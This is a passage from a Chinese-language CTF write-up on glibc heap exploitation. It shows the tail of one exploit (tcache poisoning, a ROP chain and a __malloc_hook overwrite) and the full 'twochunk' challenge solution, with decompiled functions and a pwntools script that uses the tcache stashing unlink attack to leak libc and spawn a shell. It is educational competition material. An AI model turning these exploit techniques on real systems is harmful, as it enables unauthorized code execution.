payload = '\x00' * 0x98 + p64(0x31) + p64(tcache_fake_chunk_addr) + '\x00' * 0x80 + p64(0x221) + p64(smallbins_addr) + p64(tcache_fake_chunk_addr)
new(5, 0x6b1, payload)
#raw_input('@')

pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi ; ret')))
pop_rsi_ret = libc_base + next(libc.search(asm('pop rsi ; ret')))
pop_rdx_ret = libc_base + next(libc.search(asm('pop rdx ; ret')))
pop_rax_ret = libc_base + next(libc.search(asm('pop rax ; ret')))
leave_ret = libc_base + next(libc.search(asm('leave ; ret')))
syscall_ret = libc_base + next(libc.search(asm('syscall ; ret')))
#bin_sh_addr = libc_base + next(libc.search('/bin/sh'))
bin_sh_addr = heap_base + 0xa50
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
system_addr = libc_base + libc.symbols['system']
rop_offset = heap_base + 0xa70 - 0x8
payload = '/bin/sh'.ljust(0x20, '\x00') + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
new(3, 0x218, payload) # set rop chain
#raw_input('@')
new(2, 0x218, p64(0) * 0x20 + p64(malloc_hook_addr)) # overwrite tcache 0x220's entry
secret(p64(leave_ret))
info('leave_ret = ' + hex(leave_ret))
#raw_input('@')
new(4, rop_offset, '4')
p.interactive()
```

## 2020-XCTF-GXZY-twochunk（tcache stashing unlink attack plus plus）

> 环境：Ubuntu 20.04（VMware Fusion）

这道题目在 IDA 中也需要修复一下 switch 语句。和前面一样，add 中调用 calloc，而且不能用 fastbins。这里有三个隐藏函数，分别可以用来泄漏 libc、写 system 以及调用。作者的意图比较明显，基本上就是 tcache stashing unlink attack plus plus 了：

```cpp
__int64 info()
{
  if ( !dword_4018 )
    failed();
  printf("name: %s", buf);
  printf("message: %s\n", buf + 48);
  return (unsigned int)(dword_4018-- - 1);
}

__int64 write_buf()
{
  void *buf; // ST08_8

  if ( !dword_401C )
    failed();
  printf("leave your end message: ");
  buf = malloc(0x88uLL);
  read(0, buf, 0x80uLL);
  return (unsigned int)(dword_401C-- - 1);
}

__int64 execute()
{
  return (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))buf)(
           *((_QWORD *)buf + 6),
           *((_QWORD *)buf + 7),
           *((_QWORD *)buf + 8));
}
```

漏洞同样是 edit 的时候可以多读 0x20 个字节，可以 overflow 到下一个 Chunk 的 bk：

```cpp
__int64 edit()
{
  int idx; // [rsp+Ch] [rbp-4h]

  puts("just edit once!");
  if ( !edit_flag )
    failed();
  printf("idx: ");
  idx = read_int_();
  if ( !*((_QWORD *)&unk_40A0 + 2 * idx) )
    failed();
  printf("content: ");
  read(0, *((void **)&unk_40A0 + 2 * idx), *((_DWORD *)&unk_40A8 + 4 * idx) + 0x20);
  return (unsigned int)(edit_flag-- - 1);
}
```

Exploit：

```python
#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./twochunk')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def intro(name, msg):
    p.recvuntil('name: ')
    p.send(name)
    sleep(0.1)
    p.recvuntil('your message: ')
    p.send(msg)
    sleep(0.1)

def cmd(c):
    p.recvuntil('choice: ')
    p.sendline(str(c))

def add(idx, sz):
    cmd(1)
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil('size: ')
    p.sendline(str(sz))

def free(idx):
    cmd(2)
    p.recvuntil('idx: ')
    p.sendline(str(idx))

def show(idx):
    cmd(3)
    p.recvuntil('idx: ')
    p.sendline(str(idx))

def edit(idx, content):
    cmd(4)
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil('content: ')
    p.send(content)
    sleep(0.1)

buf = 0x23333000 + 0x30
intro(p64(buf - 0x10) * 6, p64(0xdeadbeef))
for i in range(5):
    add(0, 0x88)
    free(0) # fillup tcache 0x90
# leak heap
add(0, 0xE9)
free(0) # put into tcache 0x100
add(0, 0xE9)
free(0) # put into tcache 0x100
add(0, 0x5B25) # get a chunk from tcache 0x100
show(0)
heap_base = u64(p.recv(8)) - 0x570
info('heap_base = ' + hex(heap_base))

free(0)
for i in range(7):
    add(0, 0x188)
    free(0) # fillup tcache 0x190
# create smallbins
add(0, 0x188)
add(1, 0x308) # padding
free(0) # put into unsortedbin
add(0, 0xf8) # last_remainder = 0x188 - 0xf8 = 0x90
free(0)
add(0, 0x108) # trigger consolidate ; put into smallbin 0x90
free(0)
free(1)
# repeat
add(0, 0x188)
add(1, 0x308) # padding
free(0) # put into unsortedbin
free(1)
add(0, 0xf8) # last_remainder = 0x188 - 0xf8 = 0x90
add(1, 0x108) # trigger consolidate ; put into smallbin 0x90
#gdb.attach(p)

target = 0x23333000
payload = b'\x00' * 0xf0 + p64(0) + p64(0x91) + p64(heap_base + 0x1350) + p64(target - 0x10)
#payload = p64(0xdeadbeef)
edit(0, payload) # overwrite smallbins' bk
free(1)
add(1, 0x88) # trigger smallbin stash unlink
# leak libc
cmd(5)
p.recvuntil('message: ')
libc_base = u64(p.recvuntil('\n', drop=True).ljust(8, b'\x00')) - 0x1ebc60
info('libc_base = ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
cmd(6)
payload = p64(system_addr).ljust(0x30, b'\x00') + p64(bin_sh_addr) + p64(0) + p64(0)
p.send(payload)
cmd(7)
#gdb.attach(p)
p.interactive()
```

# References

https://mp.weixin.qq.com/s/9HikpVaV5tpuBtu6hcAt3A
https://tianstcht.github.io/2020-%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-writeup-PWN/
https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312
https://balsn.tw/ctf_writeup/20191012-hitconctfquals/
http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse/
http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse-Part-2/
